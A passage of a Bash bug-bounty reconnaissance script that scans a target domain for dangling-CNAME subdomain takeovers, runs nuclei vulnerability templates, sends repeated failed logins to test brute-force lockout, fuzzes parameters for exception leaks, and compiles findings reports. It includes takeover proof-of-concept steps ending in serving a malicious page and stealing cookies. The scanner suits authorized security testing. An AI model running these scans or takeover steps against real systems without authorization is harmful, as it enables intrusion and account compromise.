start_phase 13 "SUBDOMAIN TAKEOVER — DNS DANGLING DETECTION"
log_owasp "A02:2025 Security Misconfiguration"

TAKEOVER_DIR="$OUT_DIR/05-owasp/a02-misconfig"
: > "$TAKEOVER_DIR/takeover_findings.txt"

# Service fingerprints for takeover
declare -A TAKEOVER_FINGERPRINTS
TAKEOVER_FINGERPRINTS["github"]="There isn't a GitHub Pages site here"
TAKEOVER_FINGERPRINTS["heroku"]="No such app|herokucdn.com"
TAKEOVER_FINGERPRINTS["shopify"]="Sorry, this shop is currently unavailable"
TAKEOVER_FINGERPRINTS["fastly"]="Fastly error: unknown domain"
TAKEOVER_FINGERPRINTS["pantheon"]="404 error unknown site"
TAKEOVER_FINGERPRINTS["wpengine"]="The site you were looking for couldn't be found"
TAKEOVER_FINGERPRINTS["aws_s3"]="NoSuchBucket|The specified bucket does not exist"
TAKEOVER_FINGERPRINTS["azure"]="404 - Web app not found"
TAKEOVER_FINGERPRINTS["ghost"]="Domain not found or unavailable"
TAKEOVER_FINGERPRINTS["surge"]="project not found"
TAKEOVER_FINGERPRINTS["bitbucket"]="Repository not found"
TAKEOVER_FINGERPRINTS["helpscout"]="No settings were found for this company"
TAKEOVER_FINGERPRINTS["zendesk"]="Help Center Closed"
TAKEOVER_FINGERPRINTS["tumblr"]="Whatever you were looking for doesn't live here"

# nuclei takeover if available
if command -v nuclei &>/dev/null && [ -s "$MASTER_ALIVE" ]; then
    t_run 300 nuclei -l "$MASTER_ALIVE" -t "$NUCLEI_TEMPLATES/http/takeovers/" \
        -silent -rate-limit 50 \
        -o "$TAKEOVER_DIR/nuclei_takeover.txt" 2>/dev/null || true
    [ -s "$TAKEOVER_DIR/nuclei_takeover.txt" ] && \
        log_found "Nuclei takeover results: $(count_lines "$TAKEOVER_DIR/nuclei_takeover.txt")"
fi
check_skip || { end_phase 13; }

# Manual CNAME + fingerprint check
while IFS= read -r sub; do
    check_skip || break
    CNAME=$(t_run 8 dig +short CNAME "$sub" @8.8.8.8 2>/dev/null | tail -1 | tr -d '.')
    [ -z "$CNAME" ] && continue
    # Check CNAME resolves
    CNAME_IP=$(t_run 5 dig +short "$CNAME" @8.8.8.8 2>/dev/null | head -1)
    [ -n "$CNAME_IP" ] && continue  # Resolves → not dangling
    # CNAME points somewhere but doesn't resolve → potential takeover
    RESP=$(t_run 12 curl -sk --max-time 8 "https://${sub}/" 2>/dev/null | head -c 2000)
    for svc in "${!TAKEOVER_FINGERPRINTS[@]}"; do
        FP="${TAKEOVER_FINGERPRINTS[$svc]}"
        echo "$RESP" | grep -qiE "$FP" && {
            MSG="[TAKEOVER] $sub → CNAME:$CNAME | Service:$svc | CNAME-resolves:false"
            echo "$MSG" >> "$TAKEOVER_DIR/takeover_findings.txt"
            log_critical "Subdomain takeover: $sub ($svc)"
            write_poc \
                "Subdomain Takeover — $svc" "HIGH" "A02:2025 Security Misconfiguration" \
                "https://$sub" \
                "# Verify CNAME dangling:\ndig CNAME $sub\ndig $CNAME\n\n# Claim on $svc platform, then verify access" \
                "CNAME $CNAME does not resolve. $svc service not claimed. Attacker can register service and serve content on $sub." \
                "1. Verify: dig CNAME $sub → $CNAME\n2. Verify: dig $CNAME → no answer\n3. Register $CNAME on $svc\n4. Deploy custom content to $sub\n5. Serve malicious page / steal cookies"
            break
        }
    done
done < <(safe_cat "$MASTER_ALIVE" | head -100)

log_success "Takeover findings: $(count_lines "$TAKEOVER_DIR/takeover_findings.txt")"
end_phase 13
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 14: NUCLEI SCANNING — OWASP-TAGGED TEMPLATES
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 14; then
start_phase 14 "NUCLEI SCANNING — COMPREHENSIVE TEMPLATE RUN"

NUCLEI_DIR="$OUT_DIR/05-owasp"

if ! command -v nuclei &>/dev/null; then
    log_warn "nuclei not installed — skipping phase 14"
    end_phase 14
else
    # Always run: critical + high
    log_info "Nuclei — critical/high severity..."
    t_run 600 nuclei -l "$MASTER_WEB" -rate-limit "$NUCLEI_RATE" \
        -severity critical,high -stats \
        -o "$NUCLEI_DIR/a05-injection/nuclei_crit_high.txt" 2>/dev/null || true
    log_stat "Crit/High: $(count_lines "$NUCLEI_DIR/a05-injection/nuclei_crit_high.txt")"
    check_skip || { end_phase 14; }

    # New templates
    log_info "Nuclei — new templates..."
    t_run 400 nuclei -l "$MASTER_WEB" -rate-limit "$NUCLEI_RATE" -new-templates -stats \
        -o "$NUCLEI_DIR/a02-misconfig/nuclei_new.txt" 2>/dev/null || true
    check_skip || { end_phase 14; }

    # Exposure + misconfig + tokens
    log_info "Nuclei — exposures/misconfig..."
    t_run 400 nuclei -l "$MASTER_WEB" -rate-limit "$NUCLEI_RATE" \
        -tags exposure,misconfig,token,config,panel,login \
        -o "$NUCLEI_DIR/a02-misconfig/nuclei_exposures.txt" 2>/dev/null || true
    check_skip || { end_phase 14; }

    # Takeovers on all alive
    t_run 300 nuclei -l "$MASTER_ALIVE" -rate-limit "$NUCLEI_RATE" \
        -tags takeover \
        -o "$NUCLEI_DIR/a02-misconfig/nuclei_takeover2.txt" 2>/dev/null || true
    check_skip || { end_phase 14; }

    # Tech-specific targeted scans
    declare -A TECH_MAP
    TECH_MAP["WordPress"]="$NUCLEI_TEMPLATES/http/technologies/wordpress/"
    TECH_MAP["Jenkins"]="$NUCLEI_TEMPLATES/http/technologies/jenkins/"
    TECH_MAP["PHP"]="$NUCLEI_TEMPLATES/http/technologies/php/"
    TECH_MAP["Spring"]="$NUCLEI_TEMPLATES/http/technologies/spring/"
    TECH_MAP["Grafana"]="$NUCLEI_TEMPLATES/http/technologies/grafana/"
    TECH_MAP["Kubernetes"]="$NUCLEI_TEMPLATES/http/technologies/kubernetes/"
    TECH_MAP["Elastic"]="$NUCLEI_TEMPLATES/http/technologies/elasticsearch/"
    TECH_MAP["Drupal"]="$NUCLEI_TEMPLATES/http/technologies/drupal/"
    for tech in "${!TECH_MAP[@]}"; do
        check_skip || break
        TDIR="${TECH_MAP[$tech]}"
        grep -qi "$tech" "$MASTER_TECH" 2>/dev/null && [ -d "$TDIR" ] && {
            log_found "$tech detected — targeted scan..."
            TECH_HOSTS=$(grep -i "$tech" "$MASTER_TECH" 2>/dev/null \
                | grep -oP "https?://[^\s]+" | head -1)
            [ -n "$TECH_HOSTS" ] && echo "$TECH_HOSTS" | \
                t_run 300 nuclei -rate-limit "$NUCLEI_RATE" \
                -t "$TDIR" -o "$NUCLEI_DIR/a02-misconfig/nuclei_${tech,,}.txt" 2>/dev/null || true
        }
    done
    check_skip || { end_phase 14; }

    # GF-pattern targeted (if gf installed)
    if command -v gf &>/dev/null && [ -s "$MASTER_ENDPOINTS" ]; then
        log_info "GF pattern targeted nuclei..."
        for vuln in sqli xss ssrf lfi redirect; do
            check_skip || break
            GF_OUT="$OUT_DIR/08-advanced/gf_${vuln}.txt"
            t_run 60 gf "$vuln" "$MASTER_ENDPOINTS" 2>/dev/null \
                | sort -u > "$GF_OUT" || true
            [ -s "$GF_OUT" ] && {
                log_stat "GF $vuln: $(count_lines "$GF_OUT")"
                t_run 300 nuclei -l "$GF_OUT" -rate-limit "$NUCLEI_RATE" \
                    -tags "$vuln" \
                    -o "$NUCLEI_DIR/a05-injection/nuclei_gf_${vuln}.txt" 2>/dev/null || true
            }
        done
    fi

    # Full scan (--nuclei-all flag)
    [ "$NUCLEI_ALL" = true ] && [ "${PHASE_SKIP:-false}" = false ] && {
        log_info "FULL nuclei template scan (nuclei-all mode)..."
        t_run 3600 nuclei -l "$MASTER_WEB" -rate-limit "$NUCLEI_RATE" \
            -stats -o "$NUCLEI_DIR/nuclei_full.txt" 2>/dev/null || true
    }

    NUCLEI_TOTAL=$(find "$NUCLEI_DIR" -name "nuclei_*.txt" -exec cat {} \; \
        2>/dev/null | grep -c "" || echo 0)
    log_success "Total nuclei findings: $NUCLEI_TOTAL"
    end_phase 14
fi
fi

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 15: OWASP A09/A10 — LOGGING + EXCEPTION HANDLING GAPS
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 15; then
start_phase 15 "OWASP A09/A10 — LOGGING GAPS & EXCEPTION HANDLING"
log_owasp "A09:2025 Logging & Alerting Failures / A10:2025 Exceptional Conditions"

LOG_DIR="$OUT_DIR/05-owasp/a09-logging"
EXC_DIR="$OUT_DIR/05-owasp/a10-exceptions"

# ── 15a. Brute-force protection check ────────────────────────────────────
log_info "Brute-force lockout test..."
: > "$LOG_DIR/logging_findings.txt"
LOGIN_ENDPOINTS=$(grep -iE "/(login|signin|authenticate|auth/token|api/auth|api/login)" \
    "$MASTER_ENDPOINTS" 2>/dev/null | head -5 | sort -u)
while IFS= read -r url; do
    check_skip || break
    LOCKOUT=false
    for i in $(seq 1 12); do
        check_skip || break
        CODE=$(t_run 10 curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
            -X POST -H "Content-Type: application/json" \
            -d "{\"username\":\"brutetest${i}@test.com\",\"password\":\"wrongpass${i}\"}" \
            "$url" 2>/dev/null || echo "000")
        [[ "$CODE" == "429" || "$CODE" == "403" ]] && { LOCKOUT=true; break; }
        sleep 0.3
    done
    [ "$LOCKOUT" = false ] && {
        echo "[NO LOCKOUT] $url | 12 failed logins — no rate limit triggered" \
            >> "$LOG_DIR/logging_findings.txt"
        log_found "No brute-force protection: $url"
    }
done < <(echo "$LOGIN_ENDPOINTS")
check_skip || { end_phase 15; }

# ── 15b. Exception handling — boundary values ────────────────────────────
log_info "Exception handling — boundary values..."
: > "$EXC_DIR/findings.txt"
EXCEPTION_VALS=("null" "undefined" "NaN" "Infinity" "-Infinity"
    "[]" "{}" "true" "false" "0" "-1" "2147483648" "99999999999"
    "" "''" "1e999" "1/0")
while IFS= read -r param_line; do
    check_skip || break
    URL=$(echo "$param_line" | grep -oP "https?://[^\s?]+" | head -1)
    PARAM=$(echo "$param_line" | grep -oP "[?&][a-z_]+=" | head -1 | tr -d '?&=')
    [ -z "$URL" ] || [ -z "$PARAM" ] && continue
    for val in "${EXCEPTION_VALS[@]}"; do
        check_skip || break
        ENC=$(urlencode "$val")
        TEST="${URL}?${PARAM}=${ENC}"
        RESP=$(t_run 10 curl -sk --max-time 8 "$TEST" 2>/dev/null | head -c 1000)
        echo "$RESP" | grep -qiE "(exception|traceback|stack trace|fatal error|at .+\.java|at .+\.py|System\.Exception|NullPointerException|undefined method|undefined index|NameError|TypeError)" && {
            echo "[EXCEPTION LEAK] $TEST | val:$val" >> "$EXC_DIR/findings.txt"
            log_found "Exception leak: $TEST (val=$val)"
            break
        }
    done
done < <(safe_cat "$MASTER_PARAMS" | head -25)

log_success "Logging issues: $(count_lines "$LOG_DIR/logging_findings.txt")"
log_success "Exception leaks: $(count_lines "$EXC_DIR/findings.txt")"
end_phase 15
fi


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 16: REPORT GENERATION — MARKDOWN + HTML + JSON
# ══════════════════════════════════════════════════════════════════════════════
if should_run_phase 16; then
start_phase 16 "REPORT GENERATION — MARKDOWN, HTML & JSON EXPORT"

REPORT_DIR="$OUT_DIR/09-reports"
TOTAL_RUNTIME=$(( $(date +%s) - START_TIME ))
TOTAL_RUNTIME_FMT=$(printf "%02d:%02d:%02d" \
    $((TOTAL_RUNTIME/3600)) $(((TOTAL_RUNTIME%3600)/60)) $((TOTAL_RUNTIME%60)))

# Aggregate all findings
ALL_FINDINGS="$REPORT_DIR/all_findings.txt"
{
    printf "# ALL FINDINGS — %s — %s\n\n" "$DOMAIN" "$(date '+%Y-%m-%d %H:%M:%S')"
    find "$OUT_DIR/05-owasp" -name "*.txt" -exec grep -l "\[" {} \; 2>/dev/null \
    | while read -r f; do
        [ -s "$f" ] && grep "^\[" "$f" 2>/dev/null | head -20 && true
    done
    find "$OUT_DIR/06-js-analysis" -name "*.txt" -exec grep -l "^\[" {} \; 2>/dev/null \
    | while read -r f; do
        [ -s "$f" ] && grep "^\[" "$f" 2>/dev/null | head -10 && true
    done
    find "$OUT_DIR/07-cloud" -name "*.txt" -exec grep -l "^\[" {} \; 2>/dev/null \
    | while read -r f; do
        [ -s "$f" ] && grep "^\[" "$f" 2>/dev/null | head -10 && true
    done
} > "$ALL_FINDINGS" 2>/dev/null || true
check_skip || { end_phase 16; }

# ── 16a. Count findings by severity ──────────────────────────────────────
CRIT_COUNT=$(grep -ciE "\[.*(CRITICAL|CONFIRMED|AWS|RCE|git repo|\.env|BYPASS|TAKEOVER)" \
    "$ALL_FINDINGS" "$REPORT_DIR/verified_findings.txt" 2>/dev/null || echo 0)
HIGH_COUNT=$(grep -ciE "\[.*(IDOR|SQLI|XSS|LFI|SSRF|JWT|CORS|PRIVESC|OAUTH)" \
    "$ALL_FINDINGS" 2>/dev/null || echo 0)
MED_COUNT=$(grep -ciE "\[.*(OPEN.REDIRECT|MASS.ASSIGN|NOSQL|PROTO|MISCONFIG|TLS|HEADER)" \
    "$ALL_FINDINGS" 2>/dev/null || echo 0)
INFO_COUNT=$(grep -ciE "\[.*(INFO|TECH|SERVER|SOURCEMAP|DOM.SINK|CANDIDATE)" \
    "$ALL_FINDINGS" 2>/dev/null || echo 0)

# ── 16b. Markdown report ──────────────────────────────────────────────────
log_info "Writing Markdown report..."
MD_REPORT="$REPORT_DIR/report_${DOMAIN}_${DATE}.md"
cat > "$MD_REPORT" << MDEOF
# Bug Bounty Report — ${DOMAIN}

**Generated:** $(date '+%Y-%m-%d %H:%M:%S')
**Scanner:** Elite Recon v7.0 — OWASP 2025 Deep Edition
**Scan Duration:** ${TOTAL_RUNTIME_FMT}

---

## Executive Summary

| Category | Count |
|---|---|
| 🔴 Critical | ${CRIT_COUNT} |
| 🟠 High | ${HIGH_COUNT} |
| 🟡 Medium | ${MED_COUNT} |
| 🔵 Informational | ${INFO_COUNT} |

**Target:** \`${DOMAIN}\`
**Subdomains discovered:** $(count_lines "$MASTER_SUBS")
**Live web hosts:** $(count_lines "$MASTER_WEB")
**Endpoints mapped:** $(count_lines "$MASTER_ENDPOINTS")
**JS files analyzed:** $(count_lines "$MASTER_JS")
**Parameters collected:** $(count_lines "$MASTER_PARAMS")

---

## Attack Surface Summary

### Subdomains ($(count_lines "$MASTER_SUBS"))
\`\`\`
$(safe_cat "$MASTER_SUBS" | head -30)
$([ "$(count_lines "$MASTER_SUBS")" -gt 30 ] && echo "... ($(count_lines "$MASTER_SUBS") total — see $MASTER_SUBS)")
\`\`\`

### Live Web Hosts ($(count_lines "$MASTER_WEB"))
\`\`\`
$(safe_cat "$MASTER_WEB" | head -20)
\`\`\`

### Technology Fingerprints
\`\`\`
$(safe_cat "$MASTER_TECH" | grep -v "^$" | head -20)
\`\`\`

---

## Vulnerability Findings

### A01 — Broken Access Control
$([ -s "$OUT_DIR/05-owasp/a01-access-control/idor_findings.txt" ] && \
    echo "#### IDOR Findings" && cat "$OUT_DIR/05-owasp/a01-access-control/idor_findings.txt" || \
    echo "No IDOR findings confirmed.")
$([ -s "$OUT_DIR/05-owasp/a01-access-control/privesc_findings.txt" ] && \
    echo "#### Privilege Escalation" && cat "$OUT_DIR/05-owasp/a01-access-control/privesc_findings.txt" || \
    echo "No privilege escalation confirmed.")

### A02 — Security Misconfiguration
$([ -s "$OUT_DIR/05-owasp/a02-misconfig/cors_findings.txt" ] && \
    echo "#### CORS Issues" && cat "$OUT_DIR/05-owasp/a02-misconfig/cors_findings.txt" || \
    echo "No CORS findings confirmed.")
$([ -s "$OUT_DIR/05-owasp/a02-misconfig/security_headers.txt" ] && \
    echo "#### Security Header Issues" && head -20 "$OUT_DIR/05-owasp/a02-misconfig/security_headers.txt" || \
    echo "No security header issues found.")
$([ -s "$OUT_DIR/05-owasp/a02-misconfig/takeover_findings.txt" ] && \
    echo "#### Subdomain Takeover" && cat "$OUT_DIR/05-owasp/a02-misconfig/takeover_findings.txt" || \
    echo "No subdomain takeovers found.")

### A04 — Cryptographic Failures
$([ -s "$OUT_DIR/05-owasp/a04-crypto/exposed_files.txt" ] && \
    echo "#### Exposed Config Files" && cat "$OUT_DIR/05-owasp/a04-crypto/exposed_files.txt" || \
    echo "No exposed config files found.")
$([ -s "$OUT_DIR/05-owasp/a04-crypto/tls_findings.txt" ] && \
    echo "#### TLS/SSL Issues" && cat "$OUT_DIR/05-owasp/a04-crypto/tls_findings.txt" || \
    echo "No TLS issues found.")
$([ -s "$OUT_DIR/05-owasp/a04-crypto/sensitive_data.txt" ] && \
    echo "#### Sensitive Data Exposure" && head -20 "$OUT_DIR/05-owasp/a04-crypto/sensitive_data.txt" || \
    echo "No sensitive data exposure found.")

### A05 — Injection
$([ -s "$OUT_DIR/05-owasp/a05-injection/sqli_findings.txt" ] && \
    echo "#### SQL Injection" && cat "$OUT_DIR/05-owasp/a05-injection/sqli_findings.txt" || \
    echo "No SQLi confirmed.")
$([ -s "$OUT_DIR/05-owasp/a05-injection/xss_findings.txt" ] && \
    echo "#### XSS — Reflected" && cat "$OUT_DIR/05-owasp/a05-injection/xss_findings.txt" || \
    echo "No reflected XSS confirmed.")
$([ -s "$OUT_DIR/05-owasp/a05-injection/nosql_findings.txt" ] && \
    echo "#### NoSQL Injection" && cat "$OUT_DIR/05-owasp/a05-injection/nosql_findings.txt" || \
    echo "No NoSQLi confirmed.")
$([ -s "$OUT_DIR/05-owasp/a05-injection/ssti_findings.txt" ] && \
    echo "#### SSTI" && cat "$OUT_DIR/05-owasp/a05-injection/ssti_findings.txt" || \
    echo "No SSTI confirmed.")
$([ -s "$OUT_DIR/05-owasp/a05-injection/lfi_findings.txt" ] && \
    echo "#### LFI" && cat "$OUT_DIR/05-owasp/a05-injection/lfi_findings.txt" || \
    echo "No LFI confirmed.")
$([ -s "$OUT_DIR/05-owasp/a05-injection/xxe_findings.txt" ] && \
    echo "#### XXE" && cat "$OUT_DIR/05-owasp/a05-injection/xxe_findings.txt" || \
    echo "No XXE confirmed.")

### A06 — Insecure Design
$([ -s "$OUT_DIR/05-owasp/a06-design/logic_findings.txt" ] && \
    echo "#### Business Logic" && cat "$OUT_DIR/05-owasp/a06-design/logic_findings.txt" || \
    echo "No business logic findings.")
$([ -s "$OUT_DIR/05-owasp/a06-design/race_candidates.txt" ] && \
    echo "#### Race Condition Candidates" && head -10 "$OUT_DIR/05-owasp/a06-design/race_candidates.txt" || \
    echo "No race condition candidates.")

### A07 — Authentication Failures
$([ -s "$OUT_DIR/05-owasp/a07-auth/jwt_findings.txt" ] && \
    echo "#### JWT Issues" && cat "$OUT_DIR/05-owasp/a07-auth/jwt_findings.txt" || \
    echo "No JWT issues found.")
$([ -s "$OUT_DIR/05-owasp/a07-auth/oauth_findings.txt" ] && \
    echo "#### OAuth Issues" && cat "$OUT_DIR/05-owasp/a07-auth/oauth_findings.txt" || \
    echo "No OAuth issues found.")
$([ -s "$OUT_DIR/05-owasp/a07-auth/open_redirect.txt" ] && \
    echo "#### Open Redirects" && cat "$OUT_DIR/05-owasp/a07-auth/open_redirect.txt" || \
    echo "No open redirects found.")

### Cloud / Infrastructure
$([ -s "$OUT_DIR/07-cloud/aws_metadata_hits.txt" ] && \
    echo "#### SSRF→AWS Metadata" && cat "$OUT_DIR/07-cloud/aws_metadata_hits.txt" || \
    echo "No SSRF→Cloud metadata confirmed.")
$([ -s "$OUT_DIR/07-cloud/bucket_findings.txt" ] && \
    echo "#### Cloud Buckets" && cat "$OUT_DIR/07-cloud/bucket_findings.txt" || \
    echo "No cloud bucket issues found.")

### JS Analysis
$([ -s "$OUT_DIR/06-js-analysis/api_keys_found.txt" ] && \
    echo "#### API Keys in JS" && cat "$OUT_DIR/06-js-analysis/api_keys_found.txt" || \
    echo "No API keys found in JS.")
$([ -s "$OUT_DIR/06-js-analysis/sourcemaps_found.txt" ] && \
    echo "#### Source Maps Exposed" && cat "$OUT_DIR/06-js-analysis/sourcemaps_found.txt" || \
    echo "No source maps found.")
$([ -s "$OUT_DIR/06-js-analysis/proto_pollution.txt" ] && \
    echo "#### Prototype Pollution" && cat "$OUT_DIR/06-js-analysis/proto_pollution.txt" || \
    echo "No prototype pollution found.")

---

## Verified PoCs

$(cat "$REPORT_DIR/verified_findings.txt" 2>/dev/null || echo "No verified findings.")

---

## Nuclei Scan Summary

$(find "$OUT_DIR/05-owasp" -name "nuclei_*.txt" 2>/dev/null \
    | while read -r f; do
        [ -s "$f" ] && printf "**%s** (%s findings)\n" "$(basename "$f")" "$(count_lines "$f")"
    done || echo "No nuclei results.")

---

## Scan Statistics

| Metric | Value |
|---|---|
| Total subdomains | $(count_lines "$MASTER_SUBS") |
| Live web hosts | $(count_lines "$MASTER_WEB") |
| Total endpoints | $(count_lines "$MASTER_ENDPOINTS") |
| JS files analyzed | $(count_lines "$MASTER_JS") |
| Parameters tested | $(count_lines "$MASTER_PARAMS") |
| WAF-protected hosts | $(count_lines "$OUT_DIR/02-fingerprint/waf_detected.txt") |
| Scan duration | ${TOTAL_RUNTIME_FMT} |

---

*Generated by Elite Recon v7.0 — For authorized security testing only*
MDEOF
log_success "Markdown report: $MD_REPORT"
check_skip || { end_phase 16; }

# ── 16c. JSON summary ─────────────────────────────────────────────────────
log_info "Writing JSON summary..."
JSON_OUT="$REPORT_DIR/summary_${DOMAIN}_${DATE}.json"
python3 - << PYEOF > "$JSON_OUT" 2>/dev/null || true
import json, os, datetime

def count_file(p):
    try:
        with open(p) as f:
            return sum(1 for _ in f)
    except:
        return 0

def read_file(p, n=30):
    try:
        with open(p) as f:
            return [l.strip() for l in f.readlines()[:n] if l.strip()]
    except:
        return []

out_dir = "$OUT_DIR"
domain = "$DOMAIN"
date_str = "$DATE"

summary = {
    "meta": {
        "domain": domain,
        "scan_date": datetime.datetime.now().isoformat(),
        "scanner": "Elite Recon v7.0",
        "duration_seconds": $TOTAL_RUNTIME
    },
    "scope": {
        "subdomains_total": count_file("$MASTER_SUBS"),
        "live_web_hosts": count_file("$MASTER_WEB"),
        "endpoints_mapped": count_file("$MASTER_ENDPOINTS"),
        "js_files": count_file("$MASTER_JS"),
        "parameters": count_file("$MASTER_PARAMS"),
        "waf_protected": count_file(os.path.join(out_dir, "02-fingerprint/waf_detected.txt"))
    },
    "findings": {
        "critical": $CRIT_COUNT,
        "high": $HIGH_COUNT,
        "medium": $MED_COUNT,
        "informational": $INFO_COUNT
    },
    "vulnerabilities": {
        "idor": read_file(os.path.join(out_dir, "05-owasp/a01-access-control/idor_findings.txt")),
        "cors": read_file(os.path.join(out_dir, "05-owasp/a02-misconfig/cors_findings.txt")),
        "sqli": read_file(os.path.join(out_dir, "05-owasp/a05-injection/sqli_findings.txt")),
        "xss": read_file(os.path.join(out_dir, "05-owasp/a05-injection/xss_findings.txt")),
        "lfi": read_file(os.path.join(out_dir, "05-owasp/a05-injection/lfi_findings.txt")),
        "xxe": read_file(os.path.join(out_dir, "05-owasp/a05-injection/xxe_findings.txt")),
        "ssti": read_file(os.path.join(out_dir, "05-owasp/a05-injection/ssti_findings.txt")),
        "nosql": read_file(os.path.join(out_dir, "05-owasp/a05-injection/nosql_findings.txt")),
        "ssrf_cloud": read_file(os.path.join(out_dir, "07-cloud/aws_metadata_hits.txt")),
        "exposed_files": read_file(os.path.join(out_dir, "05-owasp/a04-crypto/exposed_files.txt")),
        "jwt": read_file(os.path.join(out_dir, "05-owasp/a07-auth/jwt_findings.txt")),
        "oauth": read_file(os.path.join(out_dir, "05-owasp/a07-auth/oauth_findings.txt")),
        "open_redirect": read_file(os.path.join(out_dir, "05-owasp/a07-auth/open_redirect.txt")),
        "takeover": read_file(os.path.join(out_dir, "05-owasp/a02-misconfig/takeover_findings.txt")),
        "api_keys": read_file(os.path.join(out_dir, "06-js-analysis/api_keys_found.txt")),
        "proto_pollution": read_file(os.path.join(out_dir, "06-js-analysis/proto_pollution.txt")),
        "cloud_buckets": read_file(os.path.join(out_dir, "07-cloud/bucket_findings.txt")),
        "tls_issues": read_file(os.path.join(out_dir, "05-owasp/a04-crypto/tls_findings.txt"))
    },
    "surface": {
        "subdomains": read_file("$MASTER_SUBS", 50),
        "live_hosts": read_file("$MASTER_WEB", 50),
        "tech_fingerprints": read_file("$MASTER_TECH", 20)
    }
}

print(json.dumps(summary, indent=2))
PYEOF
log_success "JSON summary: $JSON_OUT"

end_phase 16
fi

# ══════════════════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ══════════════════════════════════════════════════════════════════════════════
TOTAL_RUNTIME=$(( $(date +%s) - START_TIME ))
T_FMT=$(printf "%02d:%02d:%02d" \
    $((TOTAL_RUNTIME/3600)) $(((TOTAL_RUNTIME%3600)/60)) $((TOTAL_RUNTIME%60)))

printf "\n${BOLD}${BG_GREEN}"
printf "  ╔══════════════════════════════════════════════════════════════╗  \n"
printf "  ║              ELITE RECON v7.0 — SCAN COMPLETE               ║  \n"
printf "  ╚══════════════════════════════════════════════════════════════╝  \n"
printf "${NC}\n"

printf "${BOLD}  TARGET   :${NC}  %s\n" "$DOMAIN"
printf "${BOLD}  DURATION :${NC}  %s\n" "$T_FMT"
printf "${BOLD}  OUTPUT   :${NC}  %s\n\n" "$OUT_DIR"

printf "${BOLD}  ── ATTACK SURFACE ──────────────────────────────────────────────${NC}\n"
printf "  Subdomains   : %s\n" "$(count_lines "$MASTER_SUBS")"
printf "  Live Hosts   : %s\n" "$(count_lines "$MASTER_WEB")"
printf "  Endpoints    : %s\n" "$(count_lines "$MASTER_ENDPOINTS")"
printf "  JS Files     : %s\n" "$(count_lines "$MASTER_JS")"
printf "  Parameters   : %s\n\n" "$(count_lines "$MASTER_PARAMS")"

printf "${BOLD}  ── FINDINGS ─────────────────────────────────────────────────────${NC}\n"
printf "  ${RED}🔴 CRITICAL${NC}  : %s\n" \
    "$(grep -ciE "CRITICAL|AWS_META|GIT.REPO|ENV.FILE|alg.none|LFI.*passwd" \
    "$OUT_DIR/09-reports/verified_findings.txt" 2>/dev/null || echo 0)"
printf "  ${YELLOW}🟠 HIGH${NC}      : %s\n" \
    "$(grep -c "^\[" "$OUT_DIR/05-owasp/a01-access-control/idor_findings.txt" \
    "$OUT_DIR/05-owasp/a05-injection/sqli_findings.txt" \
    "$OUT_DIR/05-owasp/a05-injection/xss_findings.txt" \
    "$OUT_DIR/05-owasp/a05-injection/ssti_findings.txt" \
    "$OUT_DIR/05-owasp/a05-injection/lfi_findings.txt" \
    "$OUT_DIR/05-owasp/a07-auth/jwt_findings.txt" \
    "$OUT_DIR/05-owasp/a02-misconfig/cors_findings.txt" 2>/dev/null | tail -1 || echo 0)"
printf "  ${CYAN}🟡 MEDIUM${NC}    : %s\n" \
    "$(grep -c "^\[" "$OUT_DIR/05-owasp/a07-auth/open_redirect.txt" \
    "$OUT_DIR/05-owasp/a07-auth/oauth_findings.txt" \
    "$OUT_DIR/05-owasp/a06-design/logic_findings.txt" \
    "$OUT_DIR/05-owasp/a04-crypto/tls_findings.txt" \
    "$OUT_DIR/05-owasp/a02-misconfig/security_headers.txt" 2>/dev/null | tail -1 || echo 0)"
printf "  ${BLUE}🔵 INFO${NC}      : %s\n\n" \
    "$(count_lines "$OUT_DIR/06-js-analysis/dom_sinks.txt")"

printf "${BOLD}  ── KEY FILES ────────────────────────────────────────────────────${NC}\n"
printf "  Verified PoCs  : %s\n" "$OUT_DIR/09-reports/verified_findings.txt"
printf "  Markdown Report: %s\n" \
    "$(ls "$OUT_DIR/09-reports/report_"*.md 2>/dev/null | tail -1 || echo "N/A")"
printf "  JSON Summary   : %s\n" \
    "$(ls "$OUT_DIR/09-reports/summary_"*.json 2>/dev/null | tail -1 || echo "N/A")"
printf "  All Findings   : %s\n\n" "$OUT_DIR/09-reports/all_findings.txt"

printf "${BOLD}  ── QUICK WINS (check these first) ──────────────────────────────${NC}\n"
[ -s "$OUT_DIR/06-js-analysis/api_keys_found.txt" ] && \
    printf "  ${RED}[!] API keys found in JS${NC} → %s\n" \
    "$OUT_DIR/06-js-analysis/api_keys_found.txt"
[ -s "$OUT_DIR/05-owasp/a04-crypto/exposed_files.txt" ] && \
    printf "  ${RED}[!] Exposed config/git files${NC} → %s\n" \
    "$OUT_DIR/05-owasp/a04-crypto/exposed_files.txt"
[ -s "$OUT_DIR/07-cloud/aws_metadata_hits.txt" ] && \
    printf "  ${RED}[!] SSRF→Cloud metadata${NC} → %s\n" \
    "$OUT_DIR/07-cloud/aws_metadata_hits.txt"
[ -s "$OUT_DIR/07-cloud/bucket_findings.txt" ] && \
    printf "  ${RED}[!] Cloud bucket findings${NC} → %s\n" \
    "$OUT_DIR/07-cloud/bucket_findings.txt"
[ -s "$OUT_DIR/05-owasp/a02-misconfig/takeover_findings.txt" ] && \
    printf "  ${RED}[!] Subdomain takeover${NC} → %s\n" \
    "$OUT_DIR/05-owasp/a02-misconfig/takeover_findings.txt"
[ -s "$OUT_DIR/05-owasp/a01-access-control/idor_findings.txt" ] && \
    printf "  ${YELLOW}[!] IDOR findings${NC} → %s\n" \
    "$OUT_DIR/05-owasp/a01-access-control/idor_findings.txt"
[ -s "$OUT_DIR/05-owasp/a05-injection/sqli_findings.txt" ] && \
    printf "  ${YELLOW}[!] SQL injection${NC} → %s\n" \
    "$OUT_DIR/05-owasp/a05-injection/sqli_findings.txt"
[ -s "$OUT_DIR/05-owasp/a02-misconfig/cors_findings.txt" ] && \
    printf "  ${CYAN}[!] CORS misconfig${NC} → %s\n" \
    "$OUT_DIR/05-owasp/a02-misconfig/cors_findings.txt"

printf "\n${DIM}  Resume: bash %s --resume %s${NC}\n\n" "$0" "$OUT_DIR"

